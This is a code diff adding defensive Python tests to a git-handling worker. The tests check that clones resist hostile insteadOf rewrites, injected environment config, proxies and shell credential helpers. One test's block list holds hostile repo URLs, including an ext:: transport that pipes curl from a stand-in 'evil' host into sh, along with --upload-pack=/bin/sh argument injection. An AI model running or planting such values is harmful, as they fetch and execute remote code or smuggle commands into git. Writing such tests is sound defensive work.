@@ -1904,15 +1904,219 @@ class CleanupIntegrityTests(WorkerEnv):
         with self.assertRaises(EW.CommandError):
             EW._git_remote(clone, wcfg, "status", "--porcelain")
 
-    def test_no_raw_network_git_call_survives_in_the_source(self):
-        """The invariant, asserted against the code rather than remembered."""
+    def test_no_unaudited_network_git_call_survives_in_the_source(self):
+        """The invariant, asserted against the code rather than remembered.
+
+        Every git verb that can reach the network must go through
+        `_git_remote()` (which verifies repo integrity first) — or sit on a
+        line explicitly marked `sanctioned-network-git`, with a reason. The
+        count of sanctioned exceptions is pinned so a new one cannot arrive
+        quietly.
+        """
         source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
             encoding="utf-8")
-        offenders = re.findall(
-            r'_git\((?!_)[^)]*?"(fetch|push|pull|ls-remote)"', source)
+        lines = source.splitlines()
+        verbs = ("fetch", "push", "pull", "ls-remote", "clone", "submodule",
+                 "archive")
+        offenders, sanctioned = [], 0
+        for n, line in enumerate(lines):
+            match = re.search(r'_git\((?!_)[^)]*?"(' + "|".join(verbs) + r')"', line)
+            if not match:
+                continue
+            window = "\n".join(lines[max(0, n - 6):n + 1])
+            if "sanctioned-network-git" in window:
+                sanctioned += 1
+            else:
+                offenders.append(f"{n + 1}: {line.strip()[:90]}")
         self.assertEqual([], offenders,
-                         "network git must go through _git_remote(), which "
-                         "checks repo integrity first")
+                         "network git must go through _git_remote(), or carry "
+                         "a sanctioned-network-git justification")
+        self.assertEqual(2, sanctioned,
+                         "the sanctioned exceptions are the two calls in the "
+                         "sanitized cleanup repo; a new one needs review")
+
+    def test_the_controller_never_shells_out_to_git_clone(self):
+        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
+            encoding="utf-8")
+        body = source.split("def _clone_repo", 1)[1].split("\ndef ", 1)[0]
+        self.assertNotIn('"clone"', body,
+                         "the clone is built by init + fetch, never by "
+                         "`git clone`, which reads global config before it "
+                         "resolves the url")
+
+    def test_every_raw_git_subprocess_lives_in_an_isolated_helper(self):
+        """Only three functions may hand a git command to the OS, and two of
+        them set the sanitized environment for everybody else."""
+        import ast
+        path = Path(__file__).resolve().parent / "evolve_worker.py"
+        tree = ast.parse(path.read_text(encoding="utf-8"))
+        allowed = {"_git", "_git_bytes", "_credential_helper"}
+        found = {}
+        for node in ast.walk(tree):
+            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+                continue
+            for inner in ast.walk(node):
+                if (isinstance(inner, ast.Call)
+                        and isinstance(inner.func, ast.Attribute)
+                        and inner.func.attr == "run"
+                        and getattr(inner.func.value, "id", "") == "subprocess"
+                        and inner.args
+                        and isinstance(inner.args[0], ast.List)
+                        and inner.args[0].elts
+                        and getattr(inner.args[0].elts[0], "value", "") == "git"):
+                    found.setdefault(node.name, 0)
+                    found[node.name] += 1
+        self.assertEqual(allowed, set(found),
+                         f"raw git subprocess calls appeared outside the "
+                         f"isolated helpers: {sorted(set(found) - allowed)}")
+
+
+class CloneIsolationTests(WorkerEnv):
+    """The clone itself is a controller-owned, config-isolated operation."""
+
+    def setUp(self):
+        super().setUp()
+        # A second repo with a DIFFERENT marker file, standing in for the
+        # attacker's. If a rewrite ever wins, the marker says so instantly.
+        self.attacker = self.home / "attacker.git"
+        seed = self.home / "attacker-seed"
+        seed.mkdir()
+        git(seed, "init", "-q", "-b", "main")
+        git(seed, "config", "user.email", "a@example.com")
+        git(seed, "config", "user.name", "a")
+        (seed / "MARKER").write_text("ATTACKER", encoding="utf-8")
+        write_submission(seed, "attacker-piece", meta_for("attacker-piece"))
+        git(seed, "add", "-A")
+        git(seed, "commit", "-qm", "attacker seed")
+        git(self.home, "init", "--bare", "-q", "-b", "main", str(self.attacker))
+        git(seed, "remote", "add", "origin", str(self.attacker))
+        git(seed, "push", "-q", "origin", "main")
+
+        # …and a marker on the canonical side, so "we got the right one" is
+        # a positive assertion rather than the absence of a bad one.
+        canonical_seed = self.home / "canonical-seed"
+        subprocess.run(["git", "clone", "-q", str(self.origin),
+                        str(canonical_seed)], check=True, capture_output=True)
+        git(canonical_seed, "config", "user.email", "t@example.com")
+        git(canonical_seed, "config", "user.name", "t")
+        (canonical_seed / "MARKER").write_text("CANONICAL", encoding="utf-8")
+        git(canonical_seed, "add", "-A")
+        git(canonical_seed, "commit", "-qm", "canonical marker")
+        git(canonical_seed, "push", "-q", "origin", "main")
+        self.canonical_head = git_bare(self.origin, "rev-parse", "main").strip()
+
+        self.gitconfig = self.home / "hostile.gitconfig"
+        self.gitconfig.write_text(
+            f'[url "{self.attacker}"]\n\tinsteadOf = {self.origin}\n',
+            encoding="utf-8")
+        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))
+
+    def test_a_global_insteadof_rewrite_cannot_redirect_the_clone(self):
+        clone = self.home / "clone"
+        # Prove the hostile config WOULD win against a naive clone…
+        naive = subprocess.run(
+            ["git", "clone", "-q", str(self.origin), str(self.home / "naive")],
+            capture_output=True, text=True,
+            env={**os.environ, "GIT_CONFIG_GLOBAL": str(self.gitconfig)})
+        self.assertEqual(0, naive.returncode, naive.stderr[:300])
+        self.assertEqual("ATTACKER",
+                         (self.home / "naive" / "MARKER").read_text().strip(),
+                         "the repro itself is broken if this is not the "
+                         "attacker's content")
+
+        # …and that the controller's clone is immune to it.
+        with mock.patch.dict(os.environ,
+                             {"GIT_CONFIG_GLOBAL": str(self.gitconfig)}), \
+             mock.patch.object(EW, "_GIT_ENV", None):
+            head = EW._clone_repo(self.wcfg, clone)
+
+        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip(),
+                         "the controller cloned the attacker's repository")
+        self.assertEqual(self.canonical_head, head)
+        self.assertFalse((clone / "submissions" / "attacker-piece").exists())
+        self.assertEqual(str(self.origin),
+                         git(clone, "remote", "get-url", "origin").strip())
+
+    def test_config_injected_through_the_environment_is_stripped(self):
+        clone = self.home / "clone-env"
+        hostile = {
+            "GIT_CONFIG_COUNT": "1",
+            "GIT_CONFIG_KEY_0": f"url.{self.attacker}.insteadOf",
+            "GIT_CONFIG_VALUE_0": str(self.origin),
+        }
+        with mock.patch.dict(os.environ, hostile), \
+             mock.patch.object(EW, "_GIT_ENV", None):
+            EW._clone_repo(self.wcfg, clone)
+        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip())
+
+    def test_the_sanitized_environment_has_no_rewrites_or_proxies(self):
+        with mock.patch.dict(os.environ, {"https_proxy": "http://evil:8080",
+                                          "GIT_SSH_COMMAND": "ssh -o x=y",
+                                          "GIT_CONFIG_PARAMETERS": "'a.b=c'"}), \
+             mock.patch.object(EW, "_GIT_ENV", None):
+            env = EW.controller_git_env()
+        for leaked in ("https_proxy", "GIT_SSH_COMMAND", "GIT_CONFIG_PARAMETERS",
+                       "GIT_CONFIG_COUNT", "GIT_PROXY_COMMAND"):
+            self.assertNotIn(leaked, env)
+        self.assertEqual(os.devnull, env["GIT_CONFIG_SYSTEM"])
+        self.assertEqual("1", env["GIT_CONFIG_NOSYSTEM"])
+        self.assertEqual("0", env["GIT_TERMINAL_PROMPT"])
+        self.assertEqual("https:file", env["GIT_ALLOW_PROTOCOL"])
+        config = Path(env["GIT_CONFIG_GLOBAL"]).read_text(encoding="utf-8")
+        directives = [line for line in config.splitlines()
+                      if line.strip() and not line.lstrip().startswith("#")]
+        self.assertTrue(all(d.startswith(("[credential]", "\thelper"))
+                            for d in directives),
+                        f"the sanitized config holds more than a helper: "
+                        f"{directives}")
+
+    def test_a_shell_credential_helper_is_never_carried_over(self):
+        with mock.patch.object(EW.subprocess, "run",
+                               return_value=subprocess.CompletedProcess(
+                                   [], 0, stdout="!evil --steal\n", stderr="")):
+            self.assertEqual("", EW._credential_helper())
+
+    def test_a_plain_credential_helper_is_carried_over(self):
+        with mock.patch.object(EW.subprocess, "run",
+                               return_value=subprocess.CompletedProcess(
+                                   [], 0, stdout="osxkeychain\n", stderr="")):
+            self.assertEqual("osxkeychain", EW._credential_helper())
+
+    # ── url shapes ──
+    def test_hostile_repo_urls_are_refused_before_git_sees_them(self):
+        for repo in ("ext::sh -c 'curl evil|sh'",
+                     "--upload-pack=/bin/sh",
+                     "https://user:token@github.com/kody-w/x",
+                     "https://evil.example/kody-w/x",
+                     "git://github.com/kody-w/x",
+                     "http://github.com/kody-w/x",
+                     "ssh://git@github.com/kody-w/x",
+                     "https://github.com/too/many/parts",
+                     "../evil",
+                     "-u./payload"):
+            with self.subTest(repo=repo):
+                with self.assertRaises(EW.GateError):
+                    EW.validate_repo_url(repo, self.wcfg)
+
+    def test_the_canonical_shapes_are_accepted(self):
+        self.assertEqual("https://github.com/kody-w/public-art-collective.git",
+                         EW.validate_repo_url("kody-w/public-art-collective",
+                                              self.wcfg))
+        self.assertEqual(str(self.origin),
+                         EW.validate_repo_url(str(self.origin), self.wcfg),
+                         "explicit local paths stay allowed for temp repos")
+
+    def test_a_missing_local_repo_is_refused(self):
+        with self.assertRaises(EW.GateError):
+            EW.validate_repo_url(str(self.home / "nope.git"), self.wcfg)
+
+    def test_an_extra_allowed_host_can_be_configured(self):
+        wcfg = dict(self.wcfg, allowed_repo_hosts=["github.example.com"])
+        self.assertEqual("https://github.example.com/a/b",
+                         EW.validate_repo_url("https://github.example.com/a/b",
+                                              wcfg))
+        with self.assertRaises(EW.GateError):
+            EW.validate_repo_url("https://github.com/a/b", wcfg)
 
 
 class LifecycleTests(WorkerEnv):
